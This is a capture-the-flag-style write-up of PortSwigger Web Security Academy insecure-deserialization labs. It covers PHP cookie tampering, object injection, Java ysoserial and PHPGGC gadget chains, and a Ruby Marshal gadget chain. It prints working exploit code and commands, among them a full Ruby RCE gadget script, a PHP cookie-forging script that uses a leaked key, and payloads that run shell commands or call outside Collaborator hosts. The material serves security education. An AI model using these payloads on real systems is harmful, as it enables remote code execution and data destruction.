## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Insecure Deserialization**:

**2 Modifying serialized data types**  
<blockquote>
This lab demonstrates how attackers can alter serialized data types to manipulate application behavior.
</blockquote>

**3 Using application functionality to exploit insecure deserialization**  
<blockquote>
This lab shows how legitimate application functionality can be leveraged to exploit insecure deserialization vulnerabilities.
</blockquote>
	
**4 Arbitrary object injection in PHP**  
<blockquote>
This lab demonstrates how attackers can inject arbitrary objects into PHP applications to achieve malicious effects.
</blockquote>

**5 Exploiting Java deserialization with Apache Commons**  
<blockquote>
This lab shows how attackers can exploit insecure Java deserialization using gadget chains in the Apache Commons Collections library.
</blockquote>

**6 Exploiting PHP deserialization with a pre-built gadget chain**  
<blockquote>
This lab demonstrates how attackers can exploit PHP deserialization vulnerabilities using pre-existing gadget chains for remote code execution.
</blockquote>

**7 Exploiting Ruby deserialization using a documented gadget chain**  
<blockquote>
This lab shows how attackers can exploit Ruby deserialization vulnerabilities using documented gadget chains to achieve code execution.
</blockquote>

---

### LAB 2 - Modifying serialized data types

### Lab Description

<img width="938" height="567" alt="image" src="https://github.com/user-attachments/assets/e3e1d426-19de-4ffe-9362-d228b8337037" />

### Solution

<img width="918" height="517" alt="image" src="https://github.com/user-attachments/assets/2142aeb4-6589-4f0e-9d3f-0595c2936362" />


Now,First I login as winer and copy the cookie 

<img width="1903" height="660" alt="image" src="https://github.com/user-attachments/assets/708ca65d-0c85-4d7e-b42f-f4f54cffe359" />



Decode it and we will get serilized data
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"t7h1f2f94n90ui9rewro388nwm1ause8";}  looking at serilzed data we can see that winere is 
```

user length **6** and access token has length **12** of string type to get admin we have to chang them

<img width="1920" height="658" alt="image" src="https://github.com/user-attachments/assets/9d164079-1752-48f1-9562-df3d705e149a" />

So to get the admin access  I have change **s :6: wiener** to **s:13: administer** because adminintor has 13 word and
 we did not have acess token and its type is string at that time I change it datatype to Integer represent by I  and value 0

<img width="1109" height="350" alt="image" src="https://github.com/user-attachments/assets/c891d5db-a9e0-4aa6-8e6b-f6e0d4841f44" />


Copy and paste to cookie and  send request and we will get `302` redirection and admin panel 

<img width="1320" height="573" alt="image" src="https://github.com/user-attachments/assets/a9a817c4-b3e6-4b46-bfd9-1dd17c965fcd" />


To access admin panel we have to navigate to `/admin`


<img width="1725" height="585" alt="image" src="https://github.com/user-attachments/assets/46a42969-dd3f-4ba4-8da9-1143932499eb" />



Now we have to delete carlos to solve the lab and we can see highlighted sign to how do delete carlos and then lab is solved


<img width="1635" height="618" alt="image" src="https://github.com/user-attachments/assets/f47db7d1-604f-43c8-a597-1213a1422955" />



After successfully deleting  carlos we can see no more carlos redirection to delete and lab is solved after deleting carlos     which we have did it.
 

<img width="1659" height="564" alt="image" src="https://github.com/user-attachments/assets/73c1a588-970a-4046-b95b-6b1f940ed33d" />



When working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort.


---

### LAB 3 - Using application functionality to exploit insecure deserialization

### Lab Description

<img width="900" height="430" alt="image" src="https://github.com/user-attachments/assets/707ac762-234f-4939-8335-42e796678908" />

### Overview: Using Application Functionality in Insecure Deserialization Attacks

**What is it?**
Beyond simply extracting or modifying data, insecure deserialization vulnerabilities can be abused to invoke **application functionality** in unintended and dangerous ways. This occurs when the application performs actions based on deserialized object properties without proper validation.

---

### Why It's Dangerous

When an application deserializes user-controllable input, it re-creates objects with all their attributes. If the application later uses these attributes to carry out actions (like deleting files or sending emails), an attacker can manipulate the object to make the application **execute harmful behavior**.

---

### Example Scenario

Imagine the following process:

* A user account is represented by a serialized object.
* Upon account deletion, the application automatically deletes the user’s profile picture by referencing `$user->image_location`.

If the `user` object is deserialized from untrusted input, an attacker could send a modified object like:

```php
O:4:"User":1:{s:14:"image_location";s:18:"/etc/passwd";}
```

When the attacker deletes their account, the application will attempt to delete `/etc/passwd` — a sensitive system file.

---

### Key Risks

* **File deletion or modification** via attributes like `file_path`, `temp_location`, `backup_location`
* **Remote requests** via manipulated attributes that trigger SSRF
* **SQL queries** if attributes are passed directly into a query without sanitization
* **Privilege escalation** by injecting higher permissions into object fields

---



### Solution

First after login with winer:peter we can see upload option  deleted option inspecting delete option 
 reveal delete method through form method `/myaccount/delete`

<img width="1685" height="811" alt="image" src="https://github.com/user-attachments/assets/ef1815b5-c96b-46af-92a9-76e4eadc8e58" />


So we login as wiener and we have cookie decode it reveal the serialized data

<img width="1919" height="676" alt="image" src="https://github.com/user-attachments/assets/70d43a2b-14c9-4164-821e-3ef32e5fbec1" />


After login as backup 2 account that is provided to us we can see in both the file upload location with specific username, 
So when we deleted account the profile picture whom upload options is given to also also deleted that profile picture, 
Now we can  take advantage of that we can  point file to arbitary location in serialized data and delete account which 
will also arbitrary file or **moral.txt** which is `/home/carlos/morale.txt` and  lab is solved


<img width="1920" height="450" alt="image" src="https://github.com/user-attachments/assets/dc9e0f44-8518-46ae-a926-cc0497ec32fe" />


Now  change location to that we ask to `/home/carlos….` ,Now final step is click on deleted Intercept it and the paste below **base64** encoded in cookie and then lab is solved


<img width="1752" height="483" alt="image" src="https://github.com/user-attachments/assets/099b89e0-78d1-4c2b-a313-6027a271e8b3" />



Now paste above serilzed data  and then it will delete carlos file and the lab is solved.


<img width="1405" height="654" alt="image" src="https://github.com/user-attachments/assets/8c8469ae-f210-47e0-b764-c19170200ab6" />

We can see that after redirection lab is solved.



<img width="1867" height="381" alt="image" src="https://github.com/user-attachments/assets/ab99df49-1138-44c2-9c6e-dfbeffe24e79" />


---

### LAB 4 - Arbitrary object injection in PHP

### Lab Description

<img width="925" height="500" alt="image" src="https://github.com/user-attachments/assets/d9afa95d-06ea-42cf-a81f-1d34f612d348" />

### Overview: Insecure Deserialization via Magic Methods and Arbitrary Object Injection

---

####  **What Are Magic Methods?** 

Magic methods are **special methods** in object-oriented programming that are **automatically invoked** when specific actions occur. They are named with **double underscores** (e.g., `__wakeup`, `__toString`, `__get`) and exist in languages like **PHP** and **Java**.

* In **PHP**, `__wakeup()` is called during `unserialize()`.
* In **Java**, `readObject()` is called during `ObjectInputStream.readObject()`.

> Magic methods **themselves are not vulnerabilities**, but when used in conjunction with **attacker-controlled serialized data**, they can be dangerous.

---

#### 🛠️ **Why This Matters for Deserialization Attacks**

During insecure deserialization:

* Magic methods can **automatically execute code** when an object is deserialized.
* If these methods interact with **untrusted input**, attackers can exploit them to perform unintended actions, such as file deletion, command execution, or network calls.

This makes **deserialization vulnerabilities much more powerful** than simple object tampering.

---

####  Example Scenarios 

1. **PHP Magic Method (`__wakeup`)**

   * Used to reinitialize resources when an object is unserialized.
   * If an attacker controls the `__wakeup()` logic (e.g., deletes a file path based on object property), it can be abused.

2. **Java Magic Method (`readObject`)**

   ```java
   private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
       // Called automatically during deserialization
       // If attacker controls data read here, code execution possible
   }
   ```

---

####  Arbitrary Object Injection 

One powerful aspect of insecure deserialization is the ability to **inject objects of any class** available in the application:

* The deserialization process **does not verify object type**.
* Even if the application expects a `User` object, an attacker can send a serialized object of a different class, such as `FileDeleter`, with a dangerous magic method.
* Once deserialized, the application **instantiates and triggers** the injected object.

> This means attackers can execute code from **any class loaded in the application**, even if it's unrelated to the intended functionality.

---

#### 🔍 Exploitation Process Summary

1. **Identify** application areas that deserialize data (e.g., cookies, hidden form fields, session tokens).
2. **Enumerate** classes in the codebase (source code, libraries, etc.).
3. **Look for** classes with dangerous magic methods (`__wakeup`, `readObject`, etc.).
4. **Craft** a serialized object of the target class, with controlled properties triggering malicious logic.
5. **Send** the serialized object to the vulnerable endpoint.
6. **Trigger** the deserialization and execution of the payload.

---

 
### Solution

Now when I login in provided credential and click some of link  when I goto sitemap and see php file look like serilizing and unserilzed code then send  request to repetaer 
But it doesnot have any code or we are unenabled to read the code


<img width="1918" height="533" alt="image" src="https://github.com/user-attachments/assets/a41f122b-946c-4efb-bc7a-3852e2db33f4" />


Now after that I enter tilde **(~)** sign in the last of file and now we can read the code as shown in below image


Burp Suite contains this check in the Content discovery functionality. Unfortunately, not all common extensions are included by default. For example, **vi** adds a **~** 
to the filename for the backup file which is not included in the extension list provided by Burp.


<img width="1856" height="719" alt="image" src="https://github.com/user-attachments/assets/affd0178-6629-4025-a7b4-cb5f2f0fab66" />



This is below is decoded cookie of winer we used differnet serilized attack but noting happened like changeing username to admin e.t.c


<img width="1340" height="482" alt="image" src="https://github.com/user-attachments/assets/11fcb932-6120-4cf2-82b7-3eba754836d2" />


<img width="996" height="207" alt="image" src="https://github.com/user-attachments/assets/c89a89f0-1915-4cf9-b859-1fec8ef272fc" />



 Appending tilde **(~)** sign in the last of file on cutomtemplate.php we get below code


In the provided code, there are two attributes (also referred to as properties) defined within the CustomTemplate class:
1. **$template_file_path**: This attribute stores the path to the template file associated with the CustomTemplate object.
2. **$lock_file_path**: This attribute stores the path to the lock file associated with the template file. It is constructed by appending ".lock" to the template file path.



<img width="1188" height="957" alt="image" src="https://github.com/user-attachments/assets/6bd2116e-9a3a-40c1-ade1-08dfbeacba20" />



In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path.
In Burp Decoder, use the correct syntax for serialized PHP data to create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt. Make sure to use the correct data type labels and length indicators. The final object should look like this:
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

<img width="960" height="174" alt="image" src="https://github.com/user-attachments/assets/e388d2b9-faf2-467b-8561-f027e24dd460" />



Base64 encoded the  serilized data and paste in cookie then lab is solved


<img width="1153" height="332" alt="image" src="https://github.com/user-attachments/assets/a9c0fd19-ad9c-40d5-aef3-b9616e25dd51" />



Of course, the page logic fails as it expects a `Use`r object which is not there. But my `CustomTemplate` object was deserialized and instantiated. Upon destruction and giving us 500 errorbut file is deleted and lab is solved

<img width="1418" height="542" alt="image" src="https://github.com/user-attachments/assets/4799dde1-2655-447c-a171-9323dfb8458e" />


<img width="931" height="299" alt="image" src="https://github.com/user-attachments/assets/ca960027-0221-4396-99fa-5d14e4410d02" />

---

### LAB 5 - Exploiting Java deserialization with Apache Commons

### Lab Description
<img width="915" height="439" alt="image" src="https://github.com/user-attachments/assets/7a9f2049-cef9-427b-9a31-d96b14106618" />

# Hint: Running ysoserial with Java 16+

In **Java 16 and above**, stricter access controls require you to specify certain `--add-opens` options to allow ysoserial to function correctly. Without these, you may encounter `IllegalAccessException` errors due to inaccessible internal classes.

## Example Command

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar [payload] '[command]'

```

### Overview: Gadget Chains in Insecure Deserialization Attacks

---

#### **What is a Gadget Chain?**

A **gadget chain** is a sequence of method calls across different classes that, when triggered during deserialization, leads to unintended behavior — often **remote code execution (RCE)** or file manipulation.

* **Gadget**: A method or class that performs some operation.
* **Chain**: When multiple gadgets are linked together, they pass execution along until a final **sink gadget** performs the attacker’s desired action (e.g., executing a system command or writing a file).

> **Analogy**: Like dominoes — each gadget (domino) is harmless on its own, but when connected properly, tipping the first one leads to a cascading effect.

---

#### **Example of a Gadget Chain in Action**

Imagine a web app that serializes image upload data:

1. **Kick-off Gadget**: The attacker uploads a malicious file that gets deserialized by the app.
2. **Gadget 1**: The app reads image metadata (from attacker-supplied input).
3. **Gadget 2**: It uses metadata to generate a file path.
4. **Gadget 3**: The file path includes attacker-controlled path traversal (`../../etc/passwd`).
5. **Sink Gadget**: The app writes the image to disk, overwriting critical files.

---

#### **Why Gadget Chains Are Effective**

* **Developers reuse popular libraries** (e.g., Apache Commons Collections, Spring).
* These libraries often contain exploitable classes (gadgets).
* If any method in a class performs something dangerous using untrusted input, it can be used as a sink.

> You don’t always need to write custom gadget chains — you can reuse **public chains** discovered by the community.

---

#### **Pre-built Gadget Chains: Automating Exploitation**

##### **ysoserial (Java)**

A popular tool for Java deserialization attacks.

* Generates serialized payloads based on known gadget chains.
* You can choose a library (e.g., Apache Commons Collections) and provide a command (e.g., `calc.exe`, `touch /tmp/pwned`).
* ysoserial builds the payload automatically.

**Basic usage:**

```bash
java -jar ysoserial-all.jar CommonsCollections1 'touch /tmp/pwned'
```

**For Java 16+** (due to stricter module access), use:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections1 'your-command'
```

---

#### **Other Tools for Gadget Chains**

* **Marshalsec** (for Java RMI and JNDI exploits)
* **GadgetProbe** (used for identifying classpath gadgets)
* **PHPGGC** (for PHP serialization gadget chains)

---



### Solution

Firstly, I have download yererila from this link `https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` and java 14 version from here
`https://jdk.java.net/archive/`

<img width="1656" height="103" alt="image" src="https://github.com/user-attachments/assets/e728c2c3-471a-4110-97c9-4ff794447f60" />

As this tool have a lot of payload but I have choose Common `Collection4` and copy `base64` code


<img width="1107" height="419" alt="image" src="https://github.com/user-attachments/assets/d3db0ef4-18ee-4882-b9d5-95ca5794598d" />



As we knew from cookies that it is java serilized because it starts from rOO 

Java serialized data always starts with `ac ed 00 05` hexadecimal bytes and
`rO0` in base64 format.


<img width="1690" height="405" alt="image" src="https://github.com/user-attachments/assets/1cfe0750-b7e4-4912-8f6b-7f35e37c5b2d" />



So I copy and paste cookie then urlencode key character and then send it which will gives Instantiate Transformer error



<img width="1643" height="794" alt="image" src="https://github.com/user-attachments/assets/09d024bf-e3bd-4616-bb10-c4aceb7926e2" />



After sending above request we get reponse we have solved the lab


<img width="1489" height="314" alt="image" src="https://github.com/user-attachments/assets/f5377731-4097-4c23-992f-5aeae7c8482d" />

---

### LAB 6 - Exploiting PHP deserialization with a pre-built gadget chain

### Lab Description

<img width="887" height="473" alt="image" src="https://github.com/user-attachments/assets/6df68981-2a3e-4836-b7f3-98d9488d2cf0" />


### Overview: Using Detection Gadget Chains in Deserialization Attacks

---

When testing for **insecure deserialization**, it's not always about **remote code execution (RCE)**. Some **gadget chains** are designed for **detection**, allowing you to confirm that deserialization is happening — even if you can’t immediately run arbitrary commands.

---

###  Detection-Focused Gadget Chains (Java)

#### **1. URLDNS (Universal DNS Gadget Chain)**

* **Purpose**: Triggers a **DNS lookup** to an attacker-controlled domain (e.g., Burp Collaborator).

* **Use Case**: Verifying if the server deserializes input without requiring a specific vulnerable library.

* **Advantage**:

  * **Universal** across all Java versions.
  * Doesn't depend on external libraries.

* **Usage Example**:

  ```bash
  java -jar ysoserial.jar URLDNS http://your-collaborator-id.burpcollaborator.net
  ```

* **Detection**: If your Burp Collaborator shows an incoming DNS query from the server, it confirms that **deserialization occurred**.

---

#### **2. JRMPClient**

* **Purpose**: Triggers a **TCP connection** to a specified **IP address**.

* **Use Case**: Helps detect deserialization in **firewalled environments** where DNS is blocked.

* **Note**: Requires **IP addresses**, not hostnames.

* **Technique**:

  * Try two payloads:

    * One pointing to an **internal IP** (like 127.0.0.1 or 192.168.x.x).
    * One pointing to an **external firewalled IP** (like your VPS).
  * Compare response times:

    * Fast response = no network delay (internal access).
    * Slow/hanging response = failed connection attempt (external IP) → confirms **deserialization was triggered**.

* **Usage Example**:

  ```bash
  java -jar ysoserial.jar JRMPClient 192.168.0.1
  ```

---

### 🐘 PHP Generic Gadget Chains (PHPGGC)

* **Tool**: [`PHPGGC`](https://github.com/ambionics/phpggc)

* **Purpose**: Similar to ysoserial, but for **PHP**. It uses known PHP libraries (e.g., Monolog, Laravel, Symfony) to generate gadget chains.

* **Features**:

  * Supports both **detection** and **RCE**.
  * Easy payload generation for different PHP frameworks.

* **Example**:

  ```bash
  php phpggc Laravel/RCE1 system 'id' | base64
  ```

* **Detection**: Some gadgets don’t run code but cause errors or unusual behavior in the app — useful for blind testing.

---

### Summary

| Gadget Chain | Language | Detection Method    | Works Without Library? |
| ------------ | -------- | ------------------- | ---------------------- |
| URLDNS       | Java     | DNS query           | ✅ Yes                  |
| JRMPClient   | Java     | TCP delay/timing    | ✅ Yes                  |
| PHPGGC       | PHP      | Varies (error, RCE) | ❌ Depends on library   |

---



### Solution

Notice the comment `<! — <a href=/cgi-bin/phpinfo.php>Debug</a>` → 


<img width="959" height="482" alt="image" src="https://github.com/user-attachments/assets/094f5cf1-cedf-4946-8c07-b3bd7e3c1cf4" />


 This is the path to the information about the current state of PHP.


<img width="1541" height="562" alt="image" src="https://github.com/user-attachments/assets/224e493e-2a26-45cf-8742-5c9e90c21af0" />


<img width="1260" height="690" alt="image" src="https://github.com/user-attachments/assets/28d889f2-1b73-49a0-8c4f-73ea2c42bdac" />

Browse the page looking for any interesting information. In the environment section you will see a **SECRET_KEY** variable provided.


<img width="1687" height="850" alt="image" src="https://github.com/user-attachments/assets/86dcfb4a-7283-4b7d-a9be-0b42b3c96421" />





After the authentication session cookie is returned from the server we url decode it which is a serialized object signed using the SHA1 algorithm. **There are two fields, token and sig_hmac_sha1.The key we found in the last step most likely is the one used to sign this cookie**.

<img width="1920" height="727" alt="image" src="https://github.com/user-attachments/assets/1293fc68-22fa-4a58-af67-65494f39be13" />


After decoding above base64 token value we get serilized data.


<img width="1375" height="343" alt="image" src="https://github.com/user-attachments/assets/0a2acb09-6d4f-4eb3-86a2-7ef337ccde3b" />


Modifying the cookie and observe the response from the server. Changing the signature value or the token results in an error in the
 response disclosing the framework and its version **Symfony: 4.3.6**.


<img width="1082" height="872" alt="image" src="https://github.com/user-attachments/assets/642c9a14-c8e5-4419-a3a0-b4a6ccc6a115" />


 Use the PHPGGC tool to generate a POC for **Symfony 4.3.6**.

List gadget chains using: phpggc -l. There are a few gadget chains available for the framework. You may need to try more than one gadget chain. In my lab, 
**Symfony/RCE8** and **Symfony/RCE4** did not work. **Symfony/RCE7** did.


<img width="1564" height="277" alt="image" src="https://github.com/user-attachments/assets/97257e76-c00b-40f1-a27a-02fea1b4758a" />


Run the following command to get information about any of the gadget chains: `phpggc -i Symfony/RCE7`


<img width="727" height="172" alt="image" src="https://github.com/user-attachments/assets/4742d29a-a416-46fd-8db4-4e4687e80ecc" />



Generate a gadget chain with the wget command to trigger a request to Burp Collaborator. This way you can validate whether the gadget chain works regardless of the errors it may throw.**phpggc Symfony/RCE7 system ‘wget <burp-collaborator-hostname>’ | base64**



<img width="1238" height="264" alt="image" src="https://github.com/user-attachments/assets/6e9ebc5d-c484-4e1f-a251-8a19b8bca313" />



Decoding session cookie token we get


<img width="1273" height="274" alt="image" src="https://github.com/user-attachments/assets/ab18ea81-fe2b-45aa-8110-bf07263b78f0" />


### Method to solve lab


Now, generate a gadget chain with `‘rm /home/carlos/morale.txt’`.
**phpggc Symfony/RCE4 exec ‘rm /home/carlos/morale.txt’ | base64**


<img width="1562" height="348" alt="image" src="https://github.com/user-attachments/assets/882d0072-60aa-49fd-828d-5cc025a1d42e" />


Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable.
```php

<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;

```

<img width="1902" height="213" alt="image" src="https://github.com/user-attachments/assets/f3ef3407-07c3-46e1-bba5-68e0e982a2d5" />
	
○ This will output a valid, signed cookie to the console.

<img width="1915" height="132" alt="image" src="https://github.com/user-attachments/assets/53ade3f3-1b32-48c2-a124-edb2177ffa87" />
	

In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.



<img width="1296" height="282" alt="image" src="https://github.com/user-attachments/assets/59dd76ae-245a-42e4-b5d8-d77c8974fbef" />




---

### LAB 7 - Exploiting Ruby deserialization using a documented gadget chain

### Lab Description

<img width="885" height="541" alt="image" src="https://github.com/user-attachments/assets/f787fd68-6d12-47a9-b5f9-97c2c5f57624" />

### Solution

Working with documented gadget chains
There may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually. Tweaking the code may require some basic understanding of the language and framework, and you might sometimes need to serialize the object yourself, but this approach is still considerably less effort than building an exploit from scratch

We start the lab by logging into our account,and copy the cookie


<img width="1334" height="855" alt="image" src="https://github.com/user-attachments/assets/987c8d0d-26e2-41cf-9f7b-52e823ff128e" />


Decoding the cookie session shows marshall-dump ‘conversion to byte array’ for the object and a marshal-load which tries to reconstruct the object, this clearly indicates that the object is ruby serialized.


Ruby, a popular web development language, offers a built-in feature called "serialization" to convert objects into a byte stream (series of bytes) that can be easily stored and transmitted. This process is achieved using the Marshal library.


• **marshall-dump**: This suggests that the object in the cookie was first converted into a byte array using the Marshal.dump method.
• **marshal-load**: This implies that the server, upon receiving the cookie, attempts to reconstruct the original object from the byte array using Marshal.load.



<img width="1724" height="417" alt="image" src="https://github.com/user-attachments/assets/c46874ab-c275-4afc-afc4-adab7c8aa41a" />


In the statement, it is specified that the server uses the Ruby on Rails (ROR) framework.
We will use a script written by Luke Jahnke ( `https://www.elttam.com/blog/ruby-deserialization/#content`) which will generate a serialized object taking advantage of a " gadjet chain"present in the framework used, to execute a command (in our context we want to delete the morale.txt file )

With this knowledge, we can try craft an exploit with the command we need to execute, in this case ‘rm /home/carlos/morale.txt’
in this case, we will use a Universal Deserialisation Gadget for Ruby 2.x-3.x exploit by Vaks  https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html and replace the parameters to the final exploit shown below.

 code
```
require 'base64'
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 # Ensure the Base64 module is required

# Your previous code...

# Encode the payload in Base64
encoded_payload = Base64.encode64(payload)

# Print the encoded payload
puts encoded_payload
puts payload
```
 
   **Output:**

<img width="1248" height="603" alt="image" src="https://github.com/user-attachments/assets/7641cf95-8b54-4b7b-8c8b-259897bd28a4" />

**Notice:** The id parameter is replaced with ‘rm /home/carlos/morale.txt’

i deleted the last two lines and replaced with puts payloads as i will base64 encode it on the terminal.


<img width="1910" height="140" alt="image" src="https://github.com/user-attachments/assets/aaf9f627-c0bf-46e7-b602-1b9115e9f326" />



Copy and pasting above base64 encode cookie the lab is solved


<img width="1698" height="477" alt="image" src="https://github.com/user-attachments/assets/3031d846-533f-4564-935c-786b1cd206a6" />




---

